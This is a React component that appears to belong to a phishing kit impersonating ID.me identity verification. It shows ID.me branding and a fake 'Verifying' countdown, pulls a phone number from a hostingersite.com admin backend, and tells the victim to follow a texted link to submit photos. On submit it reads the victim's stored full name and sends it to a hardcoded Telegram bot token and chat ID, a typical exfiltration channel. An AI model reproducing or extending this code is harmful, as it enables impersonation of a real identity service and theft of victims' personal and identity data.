import React, { useEffect, useState } from "react";
import logo from '../assets/ID.me_Logo.png'
import photo from '../assets/PHONE.jpg'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'

const TakePhotos: React.FC = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  const [phone, setPhone] = useState("");
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";

  // Fetch phone number from the backend
  const fetchPhoneNumber = async () => {
    try {
      const res = await fetch("https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php?action=get_phone");
      const data = await res.json();
      return data.phone || "";
    } catch (error) {
      console.error("Error fetching phone number:", error);
      return "";
    }
  };

  useEffect(() => {
    const getPhone = async () => {
      const phoneFromAPI = await fetchPhoneNumber();
      setPhone(phoneFromAPI);
    };

    getPhone();
  }, []);  
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowPopup(true);
  
    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
    const chatId = "7062736155";
    const message = `${fullName} Photos taken`;
  
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
    } catch (error) {
      console.error("Error sending to Telegram:", error);
    }
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);

  const formatPhone = (raw: string) => {
    // Remove everything except numbers
    const digits = raw.replace(/\D/g, "");

    if (digits.length === 11) {
      // +1 country code
      return `+${digits[0]} (${digits.slice(1, 4)}) ${digits.slice(4, 7)}-${digits.slice(7)}`;
    } else if (digits.length === 10) {
      return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
    } else {
      return raw; // fallback
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white px-4">
      {showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
          <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
            <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
            <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
            <p className="text-sm font-semibold text-black mb-6">
              Please wait while the system connects. Avoid refreshing the page; this may take a moment.
            </p>

            <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
              <div
                className="bg-green-500 h-4 rounded-full transition-all duration-1000"
                style={{ width: `${100 - countdown}%` }}
              ></div>
            </div>

            <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
          </div>
        </div>
      )}

      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
         <img src={connect} alt="" />
        </h1>

        {/* Message */}
        <p className=" text-3xl font-bold text-blue-200 mb-6">
          WAITING FOR YOUR PHOTOS...
          <br />
          <img src={photo} className="m-auto" />
        </p>

        <h1 className="text-2xl font-bold mb-5">We sent a text message to</h1>

        <p className="text-3xl font-bold  underline text-blue-600">
          +1 {phone ? formatPhone(phone) : "(000)-000-0000"}
        </p>

        <p className="mt-2 text-xl font-semibold">Please click the link in the text message and follow the instructions to take your photos.</p>
        <p className=" text-xl font-semibold text-green-400">This screen will automatically refresh once your photos are received</p>

        <button onClick={handleSubmit}></button>
      </div>
    </div>
  );
};

export default TakePhotos;
